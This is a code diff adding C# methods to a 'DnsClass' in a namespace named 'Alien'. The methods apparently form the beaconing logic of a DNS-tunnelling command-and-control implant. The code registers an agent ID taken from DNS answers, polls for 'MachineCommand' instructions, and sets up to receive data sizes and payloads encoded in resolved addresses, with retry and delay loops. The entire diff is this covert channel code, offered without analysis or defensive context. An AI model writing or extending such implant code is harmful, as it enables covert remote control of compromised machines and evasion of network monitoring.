@@ -6,6 +6,70 @@ namespace Alien
 {
 	internal class DnsClass
 	{
+		public static MachineCommand Alive()
+		{
+			MachineCommand ret = MachineCommand.Failed;
+			if (Config.GetAgentID() != null || DnsClass._TryMe(new Func<bool>(DnsClass._FirstAlive)))
+			{
+				DnsClass._TryMe(() => DnsClass._MainAlive(out ret));
+			}
+			Util.Log(string.Format("Alive : {0}", ret));
+			return ret;
+		}
+		private static bool _TryMe(Func<bool> fn)
+		{
+			bool result = false;
+			DnsClass._Try = 0;
+			while (!fn() && DnsClass._Try < Config.MaxTry)
+			{
+				Util.MakeDelay(1);
+			}
+			if (DnsClass._Try >= Config.MaxTry)
+			{
+				DnsClass._Try = 0;
+				Config.IncreaseCounter();
+			}
+			else
+			{
+				result = true;
+			}
+			return result;
+		}
+		private static bool _FirstAlive()
+		{
+			DnsClass._DomainMaker(Enums.DomainType.FirstAlive, Config.FirstAliveKey);
+			byte[] array;
+			bool flag = DnsClass._Resolver(out array);
+			if (flag)
+			{
+				Config.SetAgentID((int)array[3]);
+			}
+			return flag;
+		}
+		private static bool _MainAlive(out MachineCommand ret)
+		{
+			DnsClass._DomainMaker(Enums.DomainType.MainAlive, string.Empty);
+			ret = MachineCommand.Failed;
+			byte[] response;
+			bool flag = DnsClass._Resolver(out response);
+			if (flag && DnsClass._InitReceive(response))
+			{
+				ret = MachineCommand.HasData;
+			}
+			return flag;
+		}
+		private static bool _InitReceive(byte[] response)
+		{
+			if (response[0] >= 128)
+			{
+				DnsClass._ReceiveByteIndex = 0;
+				DnsClass._ReceiveDataSize = Util.GetInt(response.Skip(1).Take(3).ToArray<byte>());
+				DnsClass._ReceiveData = new byte[DnsClass._ReceiveDataSize];
+				return true;
+			}
+			return false;
+		}
+
 		private static void _DomainMaker(Enums.DomainType domainType, string data)
 		{
 			if (DnsClass._Try == 0)
